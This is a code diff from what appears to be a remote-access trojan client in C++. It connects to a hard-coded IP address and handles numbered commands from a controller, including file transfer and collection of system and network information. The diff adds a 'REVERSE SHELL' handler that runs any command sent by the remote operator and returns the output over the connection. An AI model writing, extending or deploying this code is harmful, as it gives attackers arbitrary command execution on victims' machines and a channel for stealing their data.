@@ -11,6 +11,7 @@
 #include "file/FileManager.h"
 #include "information/system/SystemInformation.h"
 #include "information/network/NetworkInformation.h"
+#include "reverse_shell/ReverseShell.h"
 
 #define IP "192.168.82.182"
 
@@ -154,6 +155,17 @@ int main() {
                             for (int i = 0; i < numOfFiles; i++) {
                                 stream.readFile(vectorOfFiles);
                             }
+                            break;
+                        }
+                        case 11: {
+                            std::cout << "REVERSE SHELL " << std::endl;
+                            std::string command = stream.readString();
+                            std::string response = ReverseShell::executeCommand("cd");
+                            response.erase(std::remove(response.begin(), response.end(), '\n'), response.cend());
+                            response.append("|"+ReverseShell::executeCommand(command));
+                            std::cout << response << std::endl;
+
+                            stream.sendString(response.c_str());
                             break;
                         }
                         case 16: {
